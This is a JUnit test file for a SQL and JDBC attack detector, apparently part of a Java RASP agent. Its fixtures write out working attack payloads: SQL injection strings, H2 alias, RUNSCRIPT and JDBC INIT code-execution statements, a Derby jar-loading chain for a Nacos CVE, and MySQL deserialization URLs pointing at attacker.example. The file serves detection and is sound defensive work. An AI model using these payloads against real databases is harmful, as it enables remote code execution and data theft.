package io.ohmyrasp.agent.detect;

import static io.ohmyrasp.agent.detect.DetectorTestSupport.assertAlgorithm;
import static io.ohmyrasp.agent.detect.DetectorTestSupport.jsonString;
import static io.ohmyrasp.agent.detect.DetectorTestSupport.request;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.model.RequestContext;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/** JdbcDetector: SQL statements, JDBC URLs and database error signals. */
final class JdbcDetectorTest {
  @ParameterizedTest
  @ValueSource(strings = {"union/* report */select 2", "union -- report\nselect 2"})
  void recognizesRequestControlledUnion(String fragment) {
    assertAlgorithm(JdbcDetector.detectSql("select 1 " + fragment, request(Map.of("filter", List.of(fragment)))),
        "sql_userinput");
  }

  @ParameterizedTest
  @ValueSource(strings = {"select sleep/* diagnostics */(3)", "select 2 where id = 2 or/* predicate */1=1"})
  void recognizesSqlStructureAcrossTokenSeparators(String query) {
    assertAlgorithm(JdbcDetector.detectSql(query, RequestContext.empty()), "sql_policy");
  }

  @Test
  void keepsSqlEvidenceAfterDialectSpecificQuoting() {
    // MySQL backslash quoting and adjacent unary minus are both legal in JDBC statements.
    assertAlgorithm(JdbcDetector.detectSql("select 'O\\'Brien' union select 2",
        request(Map.of("filter", List.of("union select 2")))), "sql_userinput");
    assertAlgorithm(JdbcDetector.detectSql("select 4--2 union select 3",
        request(Map.of("filter", List.of("union select 3")))), "sql_userinput");
  }

  @Test
  void detectsSqlUserInput() {
    var result =
        JdbcDetector.detectSql(
            "select * from users where name = '' OR '1'='1'",
            request(Map.of("value", List.of("' OR '1'='1"))));

    assertTrue(result.isPresent());
    assertEquals("sql_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSqlPolicyFeatures() {
    var result = JdbcDetector.detectSql("select sleep(3)", request());

    assertTrue(result.isPresent());
    assertEquals("sql_policy", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSqlExceptionSignals() {
    var result =
        JdbcDetector.detectSqlException(
            "mysql",
            "1064",
            "",
            "You have an error in your SQL syntax",
            "select * from where",
            request());

    assertAlgorithm(result, "sql_exception");
  }

  @Test
  void detectsSqlRegex() {
    var result =
        JdbcDetector.detectSqlRegex(
            "select table_name from information_schema.tables", "information_schema", request());

    assertAlgorithm(result, "sql_regex");
  }

  @ParameterizedTest
  @ValueSource(strings = {
      "select 'SQLJ.INSTALL_JAR( reference'",
      "select 'RUNSCRIPT FROM https://docs.invalid/guide'",
      "/* CREATE ALIAS in the ProcessBuilder manual */ select 7",
      "CREATE ALIAS REPORT FOR 'java.lang.Math.abs'; select 'ProcessBuilder documentation'",
      "values 'LANGUAGE JAVA EXTERNAL NAME'"
  })
  void keepsSqlDocumentationSeparateFromExecutableClauses(String sql) {
    assertTrue(JdbcDetector.detectSql(sql, request()).isEmpty());
  }

  @Test
  void requiresTheSubmittedValueToSupplyAStatementBoundary() {
    String query = "select 'catalog'; select 2";
    assertTrue(JdbcDetector.detectSql(query, request(Map.of("term", List.of("catalog")))).isEmpty());
    assertAlgorithm(JdbcDetector.detectSql(query, request(Map.of("term", List.of("; select 2")))), "sql_userinput");
    assertTrue(JdbcDetector.detectSql("select '; select 2'", request(Map.of("term", List.of("; select 2")))).isEmpty());
  }

  @Test
  void detectsH2JavaAliasCodeExecution() {
    var result =
        JdbcDetector.detectSql(
            """
            CREATE ALIAS SHELL AS $$
            String shell(String cmd) throws java.io.IOException {
              java.lang.Runtime.getRuntime().exec(cmd);
              return cmd;
            }
            $$
            """,
            request());

    assertAlgorithm(result, "sql_h2_code_execution");
  }

  @Test
  void detectsH2RemoteRunScript() {
    var result = JdbcDetector.detectSql("RUNSCRIPT FROM 'http://example.com/evil.sql'", request());

    assertAlgorithm(result, "sql_h2_code_execution");
  }

  @Test
  void detectsStandaloneStructuralSqlInjectionWithoutRequestContext() {
    var tautology =
        JdbcDetector.detectSql(
            "SELECT * FROM users WHERE username = 'admin' OR 1=1'", RequestContext.empty());
    var comment =
        JdbcDetector.detectSql("SELECT * FROM users WHERE username = 'admin'--'", RequestContext.empty());
    var unquotedOr =
        JdbcDetector.detectSql("SELECT * FROM users WHERE id = 1 OR 1=1", RequestContext.empty());

    assertAlgorithm(tautology, "sql_policy");
    assertAlgorithm(comment, "sql_policy");
    assertAlgorithm(unquotedOr, "sql_policy");
  }

  @Test
  void ignoresBenignWhereOneEqualsOneBuilderPrefix() {
    var result =
        JdbcDetector.detectSql(
            "SELECT * FROM users WHERE 1=1 AND status = 'active'", RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsDerbyJavaCodeLoadingSqlDuringRequest() {
    String query =
        """
        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304'' as blob)', '/tmp/payload', ',', '"', 'UTF-8', '/tmp/payload.jar')
        CALL SQLJ.INSTALL_JAR('/tmp/payload.jar', 'NACOS.PAYLOAD', 0)
        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.PAYLOAD')
        CREATE FUNCTION S_EXAMPLE(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000)
          PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
        """;

    var result = JdbcDetector.detectSql(query, request(Map.of("sql", List.of("SQLJ.INSTALL_JAR"))));

    assertAlgorithm(result, "sql_derby_code_execution");
  }

  @Test
  void detectsNacosCve202129442DerbyOpsJavaCodeLoadingSql() {
    String query =
        """
        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('values cast(X''504b0304'' as blob)', '/tmp/payload', ',', '"', 'UTF-8', '/tmp/payload.jar')
        CALL sqlj.install_jar('/tmp/payload.jar', 'NACOS.PAYLOAD', 0)
        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.PAYLOAD')
        CREATE FUNCTION S_EXAMPLE(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000)
          PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'Exec.exec'
        """;

    var result =
        JdbcDetector.detectSql(
            query,
            new RequestContext(
                "GET",
                "/nacos/v1/cs/ops/derby",
                "sql=" + query,
                Map.of("sql", List.of(query)),
                Map.of("user-agent", "JUnit")));

    assertAlgorithm(result, "sql_derby_code_execution");
    assertEquals("true", result.orElseThrow().details().get("requestControlled"));
  }

  @Test
  void ignoresDerbyJavaRoutineSqlOutsideRequest() {
    String query =
        "CREATE FUNCTION APP.ADD_ONE(PARAM INT) RETURNS INT "
            + "PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'com.example.Math.addOne'";

    assertTrue(JdbcDetector.detectSql(query, RequestContext.empty()).isEmpty());
  }

  @Test
  void ignoresOrdinaryH2Alias() {
    var result = JdbcDetector.detectSql("CREATE ALIAS UUID FOR \"java.util.UUID.randomUUID\"", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsH2JdbcInitCodeExecution() {
    var result =
        JdbcDetector.detectJdbcUrl(
            "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript java.lang.Runtime.getRuntime().exec(\"id\") $$;AUTHZPWD=\\",
            request());

    assertAlgorithm(result, "jdbc_h2_init");
  }

  @Test
  void ignoresOrdinaryH2JdbcUrl() {
    var result = JdbcDetector.detectJdbcUrl("jdbc:h2:mem:test;DB_CLOSE_DELAY=-1", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsMysqlJdbcDeserializationUrl() {
    String url =
        "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

    var result = JdbcDetector.detectJdbcUrl(url, request(Map.of("url", List.of(url))));

    assertAlgorithm(result, "jdbc_mysql_deserialization");
  }

  @Test
  void detectsLinkisCve202244645MysqlDatasourceConnectParams() {
    String params =
        "{\"autoDeserialize\":\"true\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"useSSL\":\"false\",\"maxAllowedPacket\":\"16777216\"}";
    String body =
        "{\"dataSourceName\":\"evil\",\"dataSourceTypeId\":1,\"createSystem\":\"Linkis\","
            + "\"connectParams\":{\"host\":\"attacker.example\",\"port\":\"3308\","
            + "\"username\":\"dd14fff\",\"password\":\"x\",\"params\":\""
            + jsonString(params)
            + "\"}}";
    String url =
        "jdbc:mysql://attacker.example:3308/?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&useSSL=false&maxAllowedPacket=16777216";

    var result =
        JdbcDetector.detectJdbcUrl(
            url,
            new RequestContext(
                "POST",
                "/api/rest_j/v1/data-source-manager/op/connect/json",
                "",
                Map.of(
                    "host",
                    List.of("attacker.example"),
                    "port",
                    List.of("3308"),
                    "params",
                    List.of(params)),
                Map.of("content-type", "application/json;charset=UTF-8", "user-agent", "JUnit"),
                body));

    assertAlgorithm(result, "jdbc_mysql_deserialization");
    assertEquals("mysql", result.orElseThrow().details().get("driver"));
  }

  @Test
  void detectsMariaDbJdbcDeserializationUrl() {
    String url =
        "jdbc:mariadb://attacker.example:3308/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

    var result = JdbcDetector.detectJdbcUrl(url, request(Map.of("jdbcUrl", List.of(url))));

    assertAlgorithm(result, "jdbc_mysql_deserialization");
  }

  /** Decided whoever chose the URL, as on the backport lines; request control only raises the confidence. */
  @Test
  void detectsMysqlJdbcDeserializationUrlWithoutRequestControl() {
    String url =
        "jdbc:mysql://attacker.example:3308/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";

    var inRequest = JdbcDetector.detectJdbcUrl(url, request());
    var background = JdbcDetector.detectJdbcUrl(url, RequestContext.empty());

    assertAlgorithm(inRequest, "jdbc_mysql_deserialization");
    assertEquals(92, inRequest.orElseThrow().confidence());
    assertAlgorithm(background, "jdbc_mysql_deserialization");
  }

  /**
   * autoDeserialize with an interceptor of the pool's own is not the exploit: only ServerStatusDiffInterceptor, or
   * detectCustomCollations, makes the driver read the server's bytes at connect time.
   */
  @Test
  void aPoolsOwnInterceptorBesideAutoDeserializeIsNotReported() {
    for (String url : List.of(
        "jdbc:mysql://db.internal:3306/app?autoDeserialize=true&queryInterceptors=com.example.TracingInterceptor",
        "jdbc:mysql://db.internal:3306/app?autoDeserialize=true",
        "jdbc:mysql://db.internal:3306/app?autoDeserialize=false&queryInterceptors="
            + "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
        "jdbc:postgresql://db.internal/app?autoDeserialize=true&detectCustomCollations=true",
        // Separators percent-encoded: Connector/J 8.0.33 and 5.1.49 split the query before decoding and read no
        // option from it (MysqlDeserializationUrlDriverTest), so the driver does not deserialize.
        "jdbc:mysql://db/app?autoDeserialize%3Dtrue%26queryInterceptors%3Dcom.mysql.cj.jdbc.interceptors."
            + "ServerStatusDiffInterceptor")) {
      assertTrue(JdbcDetector.detectJdbcUrl(url, RequestContext.empty()).isEmpty(), url);
    }
    for (String url : List.of(
        "jdbc:mysql://db/app?autoDeserialize=true&detectCustomCollations=true",
        "jdbc:mysql://db/app?autoDeserialize = true&statementInterceptors = "
            + "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor")) {
      assertAlgorithm(JdbcDetector.detectJdbcUrl(url, RequestContext.empty()), "jdbc_mysql_deserialization");
    }
  }

  /** The event names the driver, the host and the options; never the URL, whose credentials a pool configured. */
  @Test
  void theMysqlEventNamesTheOptionsAndNeverTheUrl() {
    String url = "jdbc:mysql://reporter:Sentinel-Pw-9@db.internal:3306/app?password=Sentinel-Pw-9&autoDeserialize=true"
        + "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

    var details = JdbcDetector.detectJdbcUrl(url, RequestContext.empty()).orElseThrow().details();

    assertEquals(Map.of("driver", "mysql", "host", "db.internal:3306",
        "options", "autoDeserialize+ServerStatusDiffInterceptor"), details);
  }

  @Test
  void ignoresRequestControlledOrdinaryMysqlJdbcUrl() {
    String url = "jdbc:mysql://db.example:3306/app?useSSL=false&connectTimeout=1000";

    var result = JdbcDetector.detectJdbcUrl(url, request(Map.of("url", List.of(url))));

    assertTrue(result.isEmpty());
  }

  @Test
  void distinguishesRequestSuppliedCatalogReferenceFromFixedCatalogQuery() {
    var body = new RequestContext("POST", "/search", "", Map.of(), Map.of("content-type", "application/json"),
        "{\"source\":\"information_schema.tables\"}");
    assertAlgorithm(JdbcDetector.detectSql("select table_name from information_schema.tables", body), "sql_userinput");
    assertTrue(JdbcDetector.detectSql("select 'information_schema.tables' as term", body).isEmpty());
  }

  @Test
  void recognizesRequestSuppliedSqlCommentOutsideQuotedData() {
    var context = request(Map.of("item", List.of("42 --")));
    assertAlgorithm(JdbcDetector.detectSql("select id from orders where id = 42 -- and active", context),
        "sql_userinput");
    assertTrue(JdbcDetector.detectSql("select id from orders where reference = '42 --'", context).isEmpty());
  }
}
